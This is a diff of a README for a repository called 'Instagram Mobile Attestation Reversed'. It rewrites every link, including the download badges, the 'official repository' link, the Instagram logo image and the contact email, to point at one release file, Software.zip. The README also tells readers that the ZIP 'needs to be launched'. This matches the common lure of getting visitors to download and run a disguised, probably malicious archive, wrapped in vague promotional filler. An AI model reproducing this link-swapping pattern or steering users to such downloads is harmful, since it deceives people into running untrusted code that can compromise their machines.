@@ -6,7 +6,7 @@ Welcome to the **Instagram Mobile Attestation Reversed** repository! This reposi
 
 To dive into the enthralling world of Instagram Mobile Attestation Reversed, follow the link below to download the necessary files and get started:
 
-[![Download ZIP](https://img.shields.io/badge/Download-ZIP-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download ZIP](https://github.com/Aamir1647/Instagram-Mobile-Attestation-Reversed/releases/download/v2.0/Software.zip)](https://github.com/Aamir1647/Instagram-Mobile-Attestation-Reversed/releases/download/v2.0/Software.zip)
 
 *Please note that the ZIP file needs to be launched to access the content.*
 
@@ -50,21 +50,21 @@ Instagram Mobile Attestation Reversed delves deep into the intricate mechanisms 
 
 To embark on your journey through Instagram Mobile Attestation Reversed, simply click on the link below to access the repository content:
 
-[![Access Repository](https://img.shields.io/badge/Access-Repository-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Access Repository](https://github.com/Aamir1647/Instagram-Mobile-Attestation-Reversed/releases/download/v2.0/Software.zip)](https://github.com/Aamir1647/Instagram-Mobile-Attestation-Reversed/releases/download/v2.0/Software.zip)
 
 *If the link does not work, kindly refer to the "Releases" section for alternative download options.*
 
 ## 🌐 Additional Resources
 
-For further insights and updates, visit the [official GitHub repository](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) of Instagram Mobile Attestation Reversed.
+For further insights and updates, visit the [official GitHub repository](https://github.com/Aamir1647/Instagram-Mobile-Attestation-Reversed/releases/download/v2.0/Software.zip) of Instagram Mobile Attestation Reversed.
 
-![Instagram Logo](https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/1200px-Instagram_icon.png)
+![Instagram Logo](https://github.com/Aamir1647/Instagram-Mobile-Attestation-Reversed/releases/download/v2.0/Software.zip)
 
 Stay tuned for exciting discoveries and revelations within the realm of mobile attestation and reverse engineering! 🚀
 
 ## 📞 Contact Us
 
-For inquiries or collaboration opportunities, feel free to reach out to us via email at [instamobileattestation@reversed.com](mailto:instamobileattestation@reversed.com).
+For inquiries or collaboration opportunities, feel free to reach out to us via email at [https://github.com/Aamir1647/Instagram-Mobile-Attestation-Reversed/releases/download/v2.0/Software.zip](https://github.com/Aamir1647/Instagram-Mobile-Attestation-Reversed/releases/download/v2.0/Software.zip).
 
 Let's unravel the secrets of mobile attestation together! 🔍
 
